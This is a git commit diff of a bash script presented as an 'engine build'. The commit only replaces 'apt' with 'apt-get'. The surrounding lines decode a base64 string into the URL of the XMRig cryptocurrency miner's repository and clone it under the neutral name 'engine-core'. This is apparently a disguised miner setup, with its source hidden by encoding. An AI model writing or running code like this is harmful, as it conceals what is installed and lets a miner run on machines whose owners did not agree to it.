179a78f1d7c5382b699cb826f8f08d3ad3259c9e
uahahhsueyyww <139884816+uahahhsueyyww@users.noreply.github.com>
2025-08-07 07:36:35 +0200

    add/update script.sh

--- script.sh
+++ script.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 echo "⚙️ Starting engine build..."
 
-apt update && apt install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev xxd automake libtool autoconf
+apt-get update && apt-get install -y git build-essential cmake libuv1-dev libssl-dev libhwloc-dev xxd automake libtool autoconf
 
 REPO_URL=$(echo "aHR0cHM6Ly9naXRodWIuY29tL3htcmlnL3htcmlnLmdpdA==" | base64 -d)
 git clone "$REPO_URL" engine-core
